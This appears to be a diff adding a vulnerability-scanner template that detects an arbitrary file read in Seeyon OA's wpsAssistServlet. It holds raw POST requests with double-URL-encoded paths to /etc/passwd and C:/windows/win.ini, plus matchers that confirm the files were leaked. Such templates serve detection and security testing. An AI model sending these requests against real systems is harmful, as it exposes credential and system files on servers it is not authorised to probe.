@@ -1,0 +1,52 @@
+id: seeyon-wpsassistservlet-arbitrary-file-read
+info:
+  name: Seeyou-OA wpsAssistServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Seeyou-OA wpsAssistServlet has a vulnerability allowing attackers to read arbitrary files. This can expose sensitive information like system passwords.
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        flag=template&templateUrl=%25%34%33%25%33%61%25%32%66%25%37%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%66%25%37%37%25%36%39%25%36%65%25%32%65%25%36%39%25%36%65%25%36%39
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=win.ini"
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        flag=template&templateUrl=%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=passwd"
+      - type: word
+        part: body
+        words:
+          - "root:"
+variables:
+  filePath: "/etc/passwd"
+  altFilePath: "C:/windows/win.ini"
